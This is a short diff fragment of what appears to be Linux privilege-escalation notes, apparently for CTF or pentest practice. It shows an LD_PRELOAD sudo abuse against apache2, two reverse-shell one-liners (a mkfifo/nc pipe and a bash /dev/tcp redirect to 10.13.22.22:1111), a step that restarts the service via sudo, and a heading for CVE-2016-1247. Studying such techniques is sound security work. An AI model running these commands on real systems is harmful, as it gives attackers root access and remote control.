@@ -416,6 +416,8 @@ sudo LD_PRELOAD=/tmp/x.so apache2
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.13.22.22 1111 >/tmp/f
 bash -i >& /dev/tcp/10.13.22.22/1111 0>&1
 ````
+- We then use our `sudo -l` privlages to restart the service
+- ![alt text](https://miro.medium.com/max/2400/1*JZqSzROFnTD6fNHWEHGSpw.png)
 ### SUID SYMLINKS CVE-2016-1247
 - Detection
 ````
